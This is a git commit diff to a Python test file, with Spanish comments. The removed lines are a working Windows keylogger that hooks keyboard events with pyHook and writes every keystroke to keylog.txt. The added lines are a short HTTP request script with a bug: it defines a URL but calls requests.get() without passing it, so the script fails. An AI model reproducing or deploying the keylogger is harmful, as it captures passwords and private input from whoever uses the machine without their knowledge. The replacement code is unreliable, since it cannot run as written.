cc1de7e6a08bd3fbeaf2a345096ba0831797a9c8
pruebaK1 <richardrodricuez96@gmail.com>
2025-02-09 14:32:15 -0500

    Update prueba01.py

--- prueba01.py
+++ prueba01.py
@@ -1,26 +1,10 @@
-import pyHook
-import pythoncom
-import logging
+import requests
 
-# Establecer el nombre del archivo de registro
-file_log = "keylog.txt"  # Puedes cambiar el nombre del archivo aquí
+url = "https://example.com/api/datos"
+response = requests.get()
 
-# Configuración de logging
-logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-
-# Función que maneja el evento del teclado
-def OnKeyboardEvent(event):
-    # Registrando la tecla pulsada en el archivo de log
-    logging.log(10, chr(event.Ascii))
-    return True
-
-# Crear y configurar el HookManager
-hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = OnKeyboardEvent
-
-# Iniciar el hook del teclado
-hooks_manager.HookKeyboard()
-
-# Mantener el script en ejecución
-pythoncom.PumpMessages()
-
+if response.status_code == 200:
+    datos = response.json()
+    print(datos)
+else:
+    print("Error al recopilar datos")
